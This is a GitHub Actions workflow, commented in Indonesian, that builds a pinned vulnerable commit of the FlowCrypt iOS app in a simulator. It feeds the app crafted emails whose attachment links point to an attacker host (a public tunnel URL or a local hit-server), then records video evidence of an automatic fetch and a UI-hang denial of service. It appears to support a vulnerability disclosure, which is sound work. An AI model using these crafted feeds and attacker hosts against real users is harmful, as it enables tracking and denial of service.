name: flowcrypt-ios-poc-video

# Rekam PoC attachment-URL FlowCrypt iOS di iOS Simulator (GitHub Actions macOS runner).
# v2: attacker host = hit-server LOKAL di runner (127.0.0.1:8002, log lengkap ke artifacts);
#     appium menerima UDID eksplisit (menghindari bug parsing platformVersion).
on:
  workflow_dispatch: {}

jobs:
  poc:
    runs-on: macos-15
    timeout-minutes: 90
    env:
      RUNID: RUN-${{ github.run_id }}
      APPIUM_HOME: /Users/runner/work/flowcrypt-ios/flowcrypt-ios/.appium-home

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Pin commit yang di-report (MARKETING_VERSION 1.3.4)
        run: |
          git remote add upstream https://github.com/FlowCrypt/flowcrypt-ios.git || true
          git fetch upstream master --tags --depth=5000
          git checkout 2323e740318b96e69c507659d58a072d786b20ed
          grep -m1 MARKETING_VERSION FlowCrypt.xcodeproj/project.pbxproj
          sed -i '' 's/objectVersion = 100;/objectVersion = 77;/' FlowCrypt.xcodeproj/project.pbxproj
          grep -m1 objectVersion FlowCrypt.xcodeproj/project.pbxproj

      - name: Restore poc/ dari ref workflow ini (dihapus oleh checkout pin)
        run: |
          git checkout "$GITHUB_REF" -- poc/
          ls -la poc/tools poc/specs

      - name: Verify core bundle prebuilt is the vulnerable one (no host guard)
        run: |
          if grep -q "flowcrypt.s3.amazonaws.com" FlowCrypt/Resources/generated/flowcrypt-ios-prod.js.txt; then
            echo "FATAL: guard ada di bundle, commit salah"; exit 1
          else
            echo "OK: guard TIDAK ada di bundle (sesuai temuan)"
          fi

      - name: Select newest Xcode (26.3 - app butuh toolchain ini)
        run: |
          XCODE_APP=$(ls -d /Applications/Xcode*.app | sort -V | tail -1)
          echo "using $XCODE_APP"
          sudo xcode-select -s "$XCODE_APP"
          xcodebuild -version

      - name: Force HTTPS for git@github.com submodules
        run: |
          git config --global url."https://github.com/".insteadOf "git@github.com:"
          git config --global --add safe.directory '*'

      - name: Boot simulator (runtime TERBARU, cocok dgn SDK Xcode 26.3)
        run: |
          # Pilih device dari runtime TERBARU (app dibangun dgn Xcode 26.3; runtime 18.5
          # tidak bisa menjalankan binary SDK 26 -> app crash saat launch).
          UDID=$(xcrun simctl list devices available -j | node -e "
            let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{
              const j=JSON.parse(d).devices;
              let best=null, bestRt='';
              const rtVer = rt => parseFloat((rt.match(/SimRuntime\.iOS-([0-9-]+)/)||[])[1]?.replace(/-/g,'.')||'0');
              for (const rt of Object.keys(j)) for (const dev of j[rt])
                if (dev.isAvailable && /^iPhone/.test(dev.name)) {
                  const v = rtVer(rt);
                  if (!best || v > bestRt) { best=dev.udid; bestRt=v; }
                }
              console.log(best);
            });")
          echo "UDID terpilih: $UDID"
          echo "SIM_UDID=$UDID" >> "$GITHUB_ENV"
          echo "POC_DEVICE_UDID=$UDID" >> "$GITHUB_ENV"
          xcrun simctl boot "$UDID"
          xcrun simctl bootstatus "$UDID" -b
          xcrun simctl list devices | grep "$UDID"
          xcrun simctl list runtimes | head -8

      - name: Build for simulator (ad-hoc signed)
        run: |
          xcodebuild -project FlowCrypt.xcodeproj \
            -scheme "Debug FlowCrypt" \
            -configuration Debug \
            -sdk iphonesimulator \
            -destination "id=$SIM_UDID" \
            -derivedDataPath build \
            -skipPackagePluginValidation \
            -skipMacroValidation \
            CODE_SIGN_IDENTITY="-" CODE_SIGNING_REQUIRED=YES CODE_SIGNING_ALLOWED=YES \
            CODE_SIGN_ENTITLEMENTS=$PWD/FlowCrypt/FlowCrypt.entitlements build | tail -25
          APP=$(find build/Build/Products -maxdepth 3 -name "*.app" | head -1)
          echo "APP_PATH=$PWD/${APP#./}" >> "$GITHUB_ENV"
          /usr/libexec/PlistBuddy -c "Print CFBundleIdentifier" "$APP/Info.plist"

      - name: Install app
        run: |
          xcrun simctl install "$SIM_UDID" "$APP_PATH"
          BID=$(/usr/libexec/PlistBuddy -c "Print CFBundleIdentifier" "$APP_PATH/Info.plist")
          echo "BUNDLE_ID=$BID" >> "$GITHUB_ENV"
          echo "installed: $BID"

      - name: Diag - launch manual + device log (bukti app hidup/mati)
        run: |
          xcrun simctl launch --console-pty "$SIM_UDID" "$BUNDLE_ID" --mock-fes-api --mock-attester-api --mock-gmail-api > /tmp/app_launch.log 2>&1 &
          APP_PID=$!
          sleep 20
          echo "--- process list (app hidup?) ---"
          xcrun simctl spawn "$SIM_UDID" launchctl list | grep -i flowcrypt || echo "APP TIDAK ADA di launchctl"
          echo "--- crash reports ---"
          ls -la ~/Library/Logs/DiagnosticReports/ 2>/dev/null | tail -5
          find ~/Library/Logs/DiagnosticReports -name "*FlowCrypt*" -newer /tmp/hit-server.pid 2>/dev/null | head -3
          echo "--- app_launch.log ---"
          cat /tmp/app_launch.log || true
          xcrun simctl terminate "$SIM_UDID" "$BUNDLE_ID" 2>/dev/null || true
          mkdir -p demo
          cp /tmp/app_launch.log demo/app-launch.log 2>/dev/null || true
          ls ~/Library/Logs/DiagnosticReports/*.ips 2>/dev/null | head -3 | xargs -I{} cp {} demo/ 2>/dev/null || true
          echo done-diag

      - name: Trust mock backend cert di SYSTEM store simulator (simctl keychain)
        run: |
          # API resmi Apple: masukkan cert mock backend (CN 127.0.0.1:8001) ke SYSTEM
          # trust store simulator, supaya SFSafariViewController mock-OAuth gak nolak TLS.
          # Ini CUMA buat mock login backend; host attacker (F1) pakai HTTPS valid publik.
          CERT=appium/api-mocks/mock-ssl-cert/cert.pem.mock
          ls -la "$CERT"
          xcrun simctl keychain "$SIM_UDID" add-root-cert "$CERT" && echo "root cert added to system store" || echo "add-root-cert FAILED"
          # restart app supaya trust ke-reload
          xcrun simctl terminate "$SIM_UDID" "$BUNDLE_ID" 2>/dev/null || true

      - name: Start attacker host (hit-server, log ke file)
        run: |
          node poc/tools/hit-server.js 8002 > /tmp/hit-server.log 2>&1 &
          echo $! > /tmp/hit-server.pid
          for i in $(seq 1 30); do
            CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:8002/open/SELFTEST-$RUNID" || true)
            if [ "$CODE" = "200" ]; then break; fi
            sleep 1
          done
          echo "selftest GET /open/SELFTEST-$RUNID -> HTTP $CODE"
          cat /tmp/hit-server.log
          test "$CODE" = "200"

      - name: Generate crafted feeds (F1 via HTTPS VALID publik, F2 dos-hang lokal)
        run: |
          cd appium
          npm ci --no-audit --no-fund 2>&1 | tail -3 || npm install --no-audit --no-fund 2>&1 | tail -3
          # F1: attacker host REALISTIS = HTTPS valid publik (cloudflared tunnel, Let's Encrypt).
          # Data(contentsOf:) memvalidasi server trust bawaan - TIDAK ada cert attacker yang ditanam.
          node ../poc/tools/gen_feed_v2.js "${{ inputs.attacker_url != '' && inputs.attacker_url || 'https://sentence-innovation-tasks-mia.trycloudflare.com' }}" api-mocks/apis/google/exported-messages "$RUNID" f1
          # F2: dos-hang deterministik via hit-server lokal (HTTP; TLS tak relevan utk hang)
          node ../poc/tools/gen_feed_v2.js "http://127.0.0.1:8002" api-mocks/apis/google/exported-messages "$RUNID" f2
          ls api-mocks/apis/google/exported-messages/ | grep poc || true

      - name: Install PoC spec + wdio config
        run: |
          cp poc/tools/wdio.poc.conf.ts appium/config/wdio.poc.conf.ts
          mkdir -p appium/tests/specs/mock/poc
          cp poc/specs/poc_attachment_v2.ts appium/tests/specs/mock/poc/poc_attachment.spec.ts

      - name: Patch mock.ts - install cert ke SYSTEM root store (iOS 26 Safari strict)
        run: |
          python3 - <<'PYEOF'
          import re
          p = "appium/api-mocks/mock.ts"
          s = open(p).read()
          old = "await driver.execute('mobile: installCertificate', { content: base64 });"
          new = "await driver.execute('mobile: installCertificate', { content: base64, isRootCertificate: true, inRootStore: true });"
          assert old in s, "target line not found"
          s = s.replace(old, new)
          open(p,"w").write(s)
          print("mock.ts patched: inRootStore=true")
          PYEOF

      - name: Install Appium XCUITest driver
        working-directory: appium
        env:
          DEVELOPER_DIR: /Applications/Xcode_16.4.app/Contents/Developer
        run: |
          npx appium -v
          npx appium driver install xcuitest 2>&1 | tail -3 || true
          npx appium driver list --installed
          ls -la "$APPIUM_HOME" 2>/dev/null || true

      - name: Prebuild WebDriverAgent (Xcode 26.3 + stub lib_TestingInterop fallback)
        run: |
          WDA_DIR="$APPIUM_HOME/node_modules/appium-xcuitest-driver/node_modules/appium-webdriveragent"
          ls "$WDA_DIR/WebDriverAgent.xcodeproj"
          SDK_LIB="/Applications/Xcode_26.3.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/lib/lib_TestingInterop.dylib"
          if [ ! -f "$SDK_LIB" ]; then
            sudo mkdir -p "$(dirname "$SDK_LIB")"
            FOUND=$(find /Applications/Xcode_26.3.app -name "lib_TestingInterop.dylib" 2>/dev/null | head -1 || true)
            if [ -n "$FOUND" ]; then
              echo "symlink dari: $FOUND"
              sudo ln -sf "$FOUND" "$SDK_LIB"
            else
              echo "dylib tidak ada di toolchain -> buat stub dylib"
              echo "int _stub = 0;" > /tmp/stub.c
              clang -dynamiclib -o /tmp/lib_TestingInterop.dylib /tmp/stub.c
              sudo cp /tmp/lib_TestingInterop.dylib "$SDK_LIB"
            fi
            ls -la "$SDK_LIB"
          fi
          xcodebuild build-for-testing \
            -project "$WDA_DIR/WebDriverAgent.xcodeproj" \
            -scheme WebDriverAgentRunner \
            -destination "id=$SIM_UDID" \
            -derivedDataPath /tmp/wda-prebuilt \
            COMPILER_INDEX_STORE_ENABLE=NO \
            CODE_SIGN_IDENTITY=- CODE_SIGNING_ALLOWED=NO 2>&1 | tail -8
          ls /tmp/wda-prebuilt/Build/Products
          test -d /tmp/wda-prebuilt/Build/Products/Debug-iphonesimulator
          echo "WDA_PREBUILT_ROOT=/tmp/wda-prebuilt" >> "$GITHUB_ENV"

      - name: "Finding 1: rekam - buka thread -> fetch otomatis"
        working-directory: appium
        run: |
          set -x
          xcrun simctl io "$SIM_UDID" recordVideo --codec=h264 --force /tmp/demo_f1.mov &
          REC=$!
          sleep 3
          CRAFTED_SUBJECT="POC attachment link F1" POC_MODE=f1 POC_DEVICE_UDID="$SIM_UDID" \
            npx wdio ./config/wdio.poc.conf.ts --spec ./tests/specs/mock/poc/poc_attachment.spec.ts \
            2>&1 | tee /tmp/wdio_f1.log || echo "wdio rc=$? (video tetap disimpan)"
          sleep 3
          kill -INT $REC 2>/dev/null || true
          sleep 4
          ls -la /tmp/demo_f1.mov

      # ================= FINDING 2 =================
      - name: "Finding 2: rekam - dos-hang (UI hang)"
        working-directory: appium
        continue-on-error: true
        run: |
          set -x
          xcrun simctl io "$SIM_UDID" recordVideo --codec=h264 --force /tmp/demo_f2.mov &
          REC=$!
          sleep 3
          CRAFTED_SUBJECT="POC attachment link F2" POC_MODE=f2 POC_DEVICE_UDID="$SIM_UDID" \
            npx wdio ./config/wdio.poc.conf.ts --spec ./tests/specs/mock/poc/poc_attachment.spec.ts \
            2>&1 | tee /tmp/wdio_f2.log || echo "wdio rc=$? (expected: hang/timeout)"
          sleep 3
          kill -INT $REC 2>/dev/null || true
          sleep 4
          ls -la /tmp/demo_f2.mov

      - name: Collect bukti tambahan
        if: always()
        run: |
          mkdir -p demo
          xcrun simctl io "$SIM_UDID" screenshot demo/sim_final.png || true
          cp /tmp/hit-server.log demo/hit-server.log || true
          cp /tmp/wdio_f1.log demo/wdio-f1.log 2>/dev/null || true
          cp /tmp/wdio_f2.log demo/wdio-f2.log 2>/dev/null || true
          ls -la /tmp/*.mov 2>/dev/null || true

      - name: Upload artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: flowcrypt-poc-bukti-${{ github.run_id }}
          path: |
            /tmp/demo_f1.mov
            /tmp/demo_f2.mov
            demo/**
            appium/tmp/**
          if-no-files-found: warn
